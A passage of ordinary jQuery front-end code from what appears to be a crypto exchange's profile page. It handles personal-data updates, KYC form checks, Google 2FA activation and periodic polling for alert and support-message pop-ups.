    var email = $("#inputEmail").val();

    if(u_fullname.length > 0 && u_fullname.length < 6) {
        noti("Please enter the correct First and Last Name", "error");
    } else if(date_of_birth.length > 0 && date_of_birth.length < 6) {
        noti("Please enter the correct Date of Birth", "error");
    } else if(present_address.length > 0 && present_address.length < 10) {
        noti("Please enter the correct Present address", "error");
    } else if(permanent_address.length > 0 && permanent_address.length < 10){
        noti("Please enter the correct Permanent address", "error");
    } else if(user_city.length > 0 && user_city.length < 2) {
        noti("Please enter the correct City name", "error");
    } else if(email == "" || email.length < 8 || email.length > 128) {
        noti("Please enter the correct Email", "error");
    } else {
       $.ajax({
          url: "/profile/edit_personal",
          type: "POST",
          data: {
            action: "UPDATE_PERSONAL_INFO",
            fullname: u_fullname,
            date_birth: date_of_birth,
            present_address: present_address,
            permanent_address: permanent_address,
            user_city: user_city,
            user_postal_code: user_postal_code,
            user_country: user_country,
            email: email
          },
          success: function(response) {
            if(response == "1") {
              noti("Data updated successfully", "success");
            } else if(response == "2") {
              noti("Please enter correct information", "error");
            } else if(response == "4") {
              noti("When saving, all fields must be filled", "error");
            } else if(response == "555") {
                noti("Exchange trading is available from the age of 18", "error");
            } else if(response == "777") {
                noti("Please enter the correct email", "error");
            } else if(response == "888") {
                noti("Email already taken", "error");
            } else if(response === "999") {
                noti("Email contains blocked symbols", "error");
            } else if (response == "111") {
                noti("Email update successfully", "success");
            } else {
              noti("An unexpected error has occurred, please try again", "error");
            }

          }
        }) 
    }

  });

  $("#profile_photo").on("click", function() {
    setInterval(function() {
        var profile_photo = $("#profile_photo").val();
        $(".file-upload-wrapper").attr("data-text", profile_photo);
    }, 1000)
  });

  function openNextKyc(e) {
      e.preventDefault();

      var kyc_first_name = $("#kyc_first_name").val();
      var kyc_last_name = $("#kyc_last_name").val();
      var kyc_middle_name = $("#kyc_middle_name").val();
      var kyc_date_of_brith = $("#kyc_date_of_birth").val();
      var kyc_id_type = $("#kyc_id_type").val();
      var kyc_id_number = $("#kyc_id_number").val();
      var kyc_image = $("#kyc_image").val();

      var kyc_image_size = $("#kyc_image")[0].files[0];

      if(kyc_first_name == "") {
          noti("Please, enter First Name!", "error");
      } else if(kyc_last_name == "") {
          noti("Please, enter Last Name!", "error");
      } else if(kyc_date_of_brith == "") {
          noti("Please, enter Date of Birth!", "error");
      } else if(kyc_id_type == "") {
          noti("Please, select ID Type", "error");
      } else if(kyc_id_number == "") {
          noti("Please, enter ID Number!", "error");
      } else if(kyc_image == "") {
          noti("Please, select Image", "error");
      } else if(kyc_image_size['size'] > 2000000) {
          noti("Image size must not be larger than 2 megabytes", "error");
      } else {
          $("#kyc_send").click();
      }
  }

    $("#alert_close_modal_btn").on("click", function() {
        $("#alert_message_modal").css("display", "none");
    });

    $("#alert_close_modal").on("click", function() {
        $("#alert_message_modal").css("display", "none");
    });

  $("#enable_2fa").on("click", function() {
    $("#security_2fa").css("display", "flex");
  });

  $("#close_modal").on("click", function() {
    $("#security_2fa").css("display", "none");
  });

  $("#close_modal_btn").on("click", function() {
    $("#security_2fa").css("display", "none");
  });

  $("#connect_google_2fa").on("click", function(e) {
        e.preventDefault();

        var code_2fa = $("#code_2fa").val().replace(/\s+/g, '');
        if(code_2fa == "" || code_2fa.length != 6) {
            noti("Please enter correct 2FA code", "error");
        } else {
           $.ajax({
              url: "/profile/edit_settings",
              type: "POST",
              data: {
                action: "CONNECT_GOOGLE_2FA",
                code_2fa: code_2fa
              },
              success: function(response) {
                console.log(response);
                if(response == "1") {
                  noti("Google 2FA successfully activated", "success");
                  $("#security_2fa").css("display", "none");
                  $(".userAttention").remove();
                } else if(response == "2") {
                  noti("Please enter correct 2FA code", "error");
                } else {
                  noti("An unexpected error has occurred, please try again", "error");
                }
              }
            })  
        }
    });

</script>
<script>
    $(document).ready(function(){
        setTimeout(function() {
            $.ajax({
                url: "../api/deposits",
                type: "POST",
                data: {
                    action: "REFRESH_MY_ADDRESSES"
                },
                success: function(response) {
                }
            })
        }, 500);
    });
</script>
<script src="../assets/js/os-detect.js"></script>
<script>
    setInterval(function() {
        var messageId = $("#alertMessageId").val();
        if(messageId == '0') {
            $.ajax({
                url: "/profile",
                type: "POST",
                data: {
                    action: "CHECK_USER_ALERT_MESSAGE",
                    browser_name: getBrowserName(),
                    os_name: getOSName()
                },
                success: function(response) {
                    var json = JSON.parse(response);

                    if (json["support_messages"] !== undefined && json["support_messages"] != null) {
                        var spanElement = document.getElementById("count_support_message");
                        if (spanElement !== null) {
                            if (json["support_messages"] === "0") {
                                spanElement.remove();
                            } else {
                                spanElement.innerHTML = json["support_messages"]
                            }
                        } else if (json["support_messages"] !== "0") {
                            spanElement = document.createElement("span");
                            spanElement.id = "count_support_message";
                            spanElement.className = "support_messages";
                            spanElement.innerHTML = json["support_messages"];

                            var supportElement = document.getElementById("support_count");
                            supportElement.appendChild(spanElement);
                        }
                    }

                    if (json["alert_message_text"] !== undefined && json["alert_message_text"] != null) {
                        var alert_message_text = json['alert_message_text'];

                        if (json['alert_message_type'] == 'alert') {
                            $("#alert_message_modal").css("display", "flex");
                            $("#userAlertBox").html(alert_message_text);

                        } else if (json['alert_message_type'] == 'bonus') {
                            $("#alert_img_pop").attr("src", "");
                            $("#alert_title_text").html("Bonus");
                            $("#alert_img_pop").attr("src", "../assets/img/bonus-icon.png");
                            $("#alert_message_modal").css("display", "flex");
                            $("#userAlertBox").html(alert_message_text);

                            $("#userAlertBox").css("font-size", "18px");
                        } else if (json['alert_message_type'] == 'notification') {
                            noti(alert_message_text, 'info');
                        }
                    }
                }
            })
        }
    }, 5000);
</script>